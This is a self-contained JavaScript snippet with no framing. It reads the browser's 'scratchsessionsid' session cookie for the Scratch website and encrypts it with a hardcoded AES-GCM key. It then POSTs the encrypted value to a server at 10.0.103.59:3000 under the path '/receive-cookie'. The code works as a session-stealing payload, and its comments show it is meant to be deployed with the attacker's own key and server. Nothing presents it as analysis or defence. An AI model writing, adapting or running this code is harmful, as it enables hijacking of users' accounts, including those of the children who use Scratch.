(async function() {
    // Function to get the value of a specified cookie
    function getCookieValue(cookieName) {
        let name = cookieName + "=";
        let decodedCookie = decodeURIComponent(document.cookie);
        let ca = decodedCookie.split(';');
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return "";
    }

    // Function to encrypt data
    async function encryptData(key, data) {
        const encoder = new TextEncoder();
        const encodedData = encoder.encode(data);

        // Generate a random initialization vector
        const iv = crypto.getRandomValues(new Uint8Array(12));

        const encryptedData = await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            encodedData
        );

        return { iv, encryptedData };
    }

    // Function to encode ArrayBuffer to Base64
    function arrayBufferToBase64(buffer) {
        let binary = '';
        let bytes = new Uint8Array(buffer);
        let len = bytes.byteLength;
        for (let i = 0; i < len; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return window.btoa(binary);
    }

    // Function to decode Base64 to ArrayBuffer
    function base64ToArrayBuffer(base64) {
        let binaryString = window.atob(base64);
        let len = binaryString.length;
        let bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        return bytes.buffer;
    }

    // Get the value of the 'scratchsessionsid' cookie
    const scratchSessionId = getCookieValue('scratchsessionsid');

    // Your predefined key (Base64 encoded)
    const keyBase64 = 'RDO6wE9k1bedbIoCsVM0w7/YHfBmjWtJsCPVS5MQpOM='; // Replace with your actual Base64 encoded key
    const keyBuffer = base64ToArrayBuffer(keyBase64);

    // Import the key
    const key = await crypto.subtle.importKey(
        'raw',
        keyBuffer,
        'AES-GCM',
        false,
        ['encrypt', 'decrypt']
    );

    // Encrypt the data
    const { iv, encryptedData } = await encryptData(key, scratchSessionId);

    // Convert encrypted data and iv to Base64
    const ivBase64 = arrayBufferToBase64(iv);
    const encryptedDataBase64 = arrayBufferToBase64(encryptedData);

    // Correctly replace with your server's HTTPS URL
    fetch('https://10.0.103.59:3000/receive-cookie', { // Ensure the URL is correctly typed
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            iv: ivBase64,
            data: encryptedDataBase64 
        }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        console.log('Cookie sent successfully:', data);
    })
    .catch(error => {
        console.error('Error sending cookie:', error);
    });
})();
